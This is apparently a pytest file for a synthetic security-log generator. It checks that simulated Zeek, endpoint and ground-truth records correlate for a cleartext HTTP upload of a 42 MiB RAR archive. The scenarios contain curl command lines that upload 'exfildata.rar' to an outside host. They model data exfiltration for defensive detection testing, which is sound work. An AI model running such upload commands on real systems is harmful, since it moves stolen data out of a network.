# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: MIT

"""End-to-end coverage for authored cleartext HTTP request file analysis."""

import json
from datetime import UTC, datetime
from pathlib import Path

import pytest

from evidenceforge.generation.activity.http_multipart import build_http_multipart_context
from evidenceforge.generation.engine import GenerationEngine
from evidenceforge.models.http import HttpMultipartEntitySpec
from evidenceforge.models.scenario import (
    BaselineActivity,
    Environment,
    NetworkConfig,
    NetworkSegment,
    NetworkSensor,
    OutputSpec,
    Scenario,
    StorylineEvent,
    System,
    TimeWindow,
    User,
)


def _read_ndjson(root: Path, filename: str) -> list[dict]:
    return [
        json.loads(line)
        for path in root.rglob(filename)
        for line in path.read_text(encoding="utf-8").splitlines()
        if line
    ]


@pytest.mark.soak
def test_curl_raw_42_mib_rar_upload_correlates_http_files_endpoint_and_ground_truth(
    tmp_path: Path,
) -> None:
    """The canonical scenario example produces exact request-side evidence end to end."""

    scenario = Scenario(
        version="1.0",
        name="http-upload-acceptance",
        description="Focused cleartext HTTP upload acceptance scenario",
        environment=Environment(
            description="One workstation with Zeek visibility",
            users=[
                User(
                    username="analyst",
                    full_name="Test Analyst",
                    email="analyst@corp.local",
                    primary_system="hostA",
                )
            ],
            systems=[
                System(
                    hostname="hostA",
                    ip="10.0.0.10",
                    os="Windows 11",
                    type="workstation",
                    assigned_user="analyst",
                )
            ],
            network=NetworkConfig(
                segments=[
                    NetworkSegment(
                        name="workstations",
                        cidr="10.0.0.0/24",
                        exposure="internal",
                        systems=["hostA"],
                    )
                ],
                sensors=[
                    NetworkSensor(
                        type="network",
                        name="core-zeek",
                        monitoring_segments=["workstations"],
                        direction="bidirectional",
                        placement="span",
                        capture_profile="well_synced",
                        log_formats=["zeek"],
                    )
                ],
            ),
        ),
        time_window=TimeWindow(
            start=datetime(2024, 1, 15, 10, 0, tzinfo=UTC),
            duration="1h",
        ),
        baseline_activity=BaselineActivity(
            description="Minimal background activity",
            intensity="low",
            variation="low",
        ),
        storyline=[
            StorylineEvent(
                id="upload-001",
                time="+15m",
                actor="analyst",
                system="hostA",
                activity="Upload a staged RAR file over cleartext HTTP",
                events=[
                    {
                        "type": "process",
                        "process_name": r"C:\Windows\System32\curl.exe",
                        "command_line": (
                            r"C:\Windows\System32\curl.exe --data-binary "
                            r"@C:\Temp\exfildata.rar "
                            "http://some.site/uploads/accept-upload"
                        ),
                    },
                    {
                        "type": "connection",
                        "dst_ip": "45.33.32.30",
                        "dst_port": 80,
                        "hostname": "some.site",
                        "service": "http",
                        "method": "POST",
                        "uri": "/uploads/accept-upload",
                        "request_body_len": 42 * 1024 * 1024,
                        "status_code": 200,
                    },
                ],
            )
        ],
        output=OutputSpec(
            logs=[{"format": "zeek"}, {"format": "ecar"}, {"format": "windows"}],
            destination="./data",
        ),
    )

    GenerationEngine(scenario, tmp_path).generate()

    http_row = next(
        row for row in _read_ndjson(tmp_path, "http.json") if row["request_body_len"] == 44_040_192
    )
    assert "orig_filenames" not in http_row
    assert http_row["orig_mime_types"] == ["application/vnd.rar"]
    upload_row = next(
        row for row in _read_ndjson(tmp_path, "files.json") if row["fuid"] in http_row["orig_fuids"]
    )
    assert upload_row["conn_uids"] == [http_row["uid"]]
    assert upload_row["is_orig"] is True
    assert upload_row["tx_hosts"] == [http_row["id.orig_h"]]
    assert upload_row["rx_hosts"] == [http_row["id.resp_h"]]
    assert upload_row["total_bytes"] == upload_row["seen_bytes"] == 44_040_192
    assert upload_row["mime_type"] == "application/vnd.rar"
    assert upload_row["sha1"]

    conn_row = next(
        row for row in _read_ndjson(tmp_path, "conn.json") if row["uid"] == http_row["uid"]
    )
    assert conn_row["ts"] <= upload_row["ts"]
    assert upload_row["ts"] + upload_row["duration"] <= (
        conn_row["ts"] + conn_row["duration"] + 0.000001
    )

    ecar_rows = _read_ndjson(tmp_path, "ecar.json")
    curl_create = next(
        row
        for row in ecar_rows
        if row.get("object") == "PROCESS"
        and row.get("action") == "CREATE"
        and str(row.get("properties", {}).get("image_path", "")).endswith("curl.exe")
    )
    local_read = next(
        row
        for row in ecar_rows
        if row.get("object") == "FILE"
        and row.get("action") == "READ"
        and row.get("properties", {}).get("file_path") == r"C:\Temp\exfildata.rar"
    )
    assert local_read["pid"] == curl_create["pid"]

    ground_truth = json.loads((tmp_path / "GROUND_TRUTH.json").read_text(encoding="utf-8"))
    upload_truth = next(
        event["attributes"]["http_upload"]
        for event in ground_truth["events"]
        if event.get("attributes", {}).get("http_upload")
    )
    assert upload_truth | {"wire_filename": upload_truth.get("wire_filename")} == {
        "request_body_len": 44_040_192,
        "mime_type": "application/vnd.rar",
        "local_source_path": r"C:\Temp\exfildata.rar",
        "local_source_filename": "exfildata.rar",
        "wire_filename": None,
    }


@pytest.mark.slow
def test_curl_multipart_42_mib_rar_upload_uses_leaf_and_envelope_sizes(
    tmp_path: Path,
) -> None:
    """A multipart RAR upload separates the decoded file from serialized body bytes."""

    multipart_spec = HttpMultipartEntitySpec.model_validate(
        {
            "media_type": "multipart/form-data",
            "boundary": "------------------------0123456789ABCDEF",
            "parts": [
                {
                    "name": "archive",
                    "body_len": 42 * 1024 * 1024,
                    "local_source_path": r"C:\Temp\exfildata.rar",
                    "filename": "exfildata.rar",
                    "content_type": "application/vnd.rar",
                    "detected_mime_type": "application/vnd.rar",
                }
            ],
        }
    )
    multipart = build_http_multipart_context(multipart_spec, stable_key="acceptance")
    scenario = Scenario(
        version="1.0",
        name="http-multipart-upload-acceptance",
        description="Focused cleartext HTTP multipart upload acceptance scenario",
        environment=Environment(
            description="One workstation with Zeek visibility",
            users=[
                User(
                    username="analyst",
                    full_name="Test Analyst",
                    email="analyst@corp.local",
                    primary_system="hostA",
                )
            ],
            systems=[
                System(
                    hostname="hostA",
                    ip="10.0.0.10",
                    os="Windows 11",
                    type="workstation",
                    assigned_user="analyst",
                )
            ],
            network=NetworkConfig(
                segments=[
                    NetworkSegment(
                        name="workstations",
                        cidr="10.0.0.0/24",
                        exposure="internal",
                        systems=["hostA"],
                    )
                ],
                sensors=[
                    NetworkSensor(
                        type="network",
                        name="core-zeek",
                        monitoring_segments=["workstations"],
                        direction="bidirectional",
                        placement="span",
                        capture_profile="well_synced",
                        log_formats=["zeek"],
                    )
                ],
            ),
        ),
        time_window=TimeWindow(
            start=datetime(2024, 1, 15, 10, 0, tzinfo=UTC),
            duration="1h",
        ),
        baseline_activity=BaselineActivity(
            description="Minimal background activity",
            intensity="low",
            variation="low",
        ),
        storyline=[
            StorylineEvent(
                id="multipart-upload-001",
                time="+15m",
                actor="analyst",
                system="hostA",
                activity="Upload a RAR file in a cleartext HTTP form",
                events=[
                    {
                        "type": "process",
                        "process_name": r"C:\Windows\System32\curl.exe",
                        "command_line": (
                            r"C:\Windows\System32\curl.exe "
                            r"-F archive=@C:\Temp\exfildata.rar "
                            "http://some.site/uploads/accept-upload"
                        ),
                    },
                    {
                        "type": "connection",
                        "dst_ip": "45.33.32.30",
                        "dst_port": 80,
                        "hostname": "some.site",
                        "service": "http",
                        "method": "POST",
                        "uri": "/uploads/accept-upload",
                        "request_body_len": multipart.body_len,
                        "request_multipart": multipart_spec.model_dump(mode="json"),
                        "status_code": 200,
                    },
                ],
            )
        ],
        output=OutputSpec(
            logs=[{"format": "zeek"}, {"format": "ecar"}, {"format": "windows"}],
            destination="./data",
        ),
    )

    GenerationEngine(scenario, tmp_path).generate()

    http_row = next(
        row
        for row in _read_ndjson(tmp_path, "http.json")
        if row["request_body_len"] == multipart.body_len
    )
    assert http_row["request_body_len"] > 44_040_192
    assert http_row["orig_filenames"] == ["exfildata.rar"]
    assert http_row["orig_mime_types"] == ["application/vnd.rar"]
    upload_row = next(
        row for row in _read_ndjson(tmp_path, "files.json") if row["fuid"] in http_row["orig_fuids"]
    )
    assert upload_row["seen_bytes"] == 44_040_192
    assert "total_bytes" not in upload_row
    assert upload_row["is_orig"] is True
    assert upload_row["filename"] == "exfildata.rar"
    assert upload_row["mime_type"] == "application/vnd.rar"

    local_reads = [
        row
        for row in _read_ndjson(tmp_path, "ecar.json")
        if row.get("object") == "FILE"
        and row.get("action") == "READ"
        and row.get("properties", {}).get("file_path") == r"C:\Temp\exfildata.rar"
    ]
    assert len(local_reads) == 1

    ground_truth = json.loads((tmp_path / "GROUND_TRUTH.json").read_text(encoding="utf-8"))
    multipart_truth = next(
        event["attributes"]["http_multipart"]
        for event in ground_truth["events"]
        if event.get("attributes", {}).get("http_multipart")
    )
    assert multipart_truth["request"]["body_len"] == multipart.body_len
    assert multipart_truth["request"]["parts"][0]["decoded_size"] == 44_040_192
    assert multipart_truth["request"]["parts"][0]["fuids"]
